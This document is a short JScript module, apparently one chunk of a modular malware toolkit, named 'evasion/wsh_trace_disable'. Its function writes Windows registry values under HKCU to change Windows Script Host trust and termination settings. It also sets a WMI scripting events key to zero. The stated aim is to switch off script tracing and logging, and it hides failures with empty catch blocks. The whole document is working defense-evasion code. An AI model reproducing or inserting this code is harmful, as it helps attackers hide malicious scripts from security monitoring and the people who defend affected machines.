// chunk: evasion/wsh_trace_disable
// depends: (none)
// provides: disable_traces
// format: jscript
// note: Modifies WSH settings via registry to disable trust policy and
//       script tracing under HKCU\Software\Microsoft\Windows Script Host.

function disable_traces() {
    try {
        var sh = new ActiveXObject("WScript.Shell");
        var base = "HKCU\\Software\\Microsoft\\Windows Script Host\\Settings\\";
        sh.RegWrite(base + "TrustPolicy", 0, "REG_DWORD");
        sh.RegWrite(base + "SilentTerminate", 0, "REG_DWORD");
    } catch(e) {}
    /* Disable WMI script event consumer logging */
    try {
        var sh2 = new ActiveXObject("WScript.Shell");
        sh2.RegWrite("HKCU\\Software\\Microsoft\\Wbem\\Scripting\\EnableEvents", 0, "REG_DWORD");
    } catch(e) {}
}
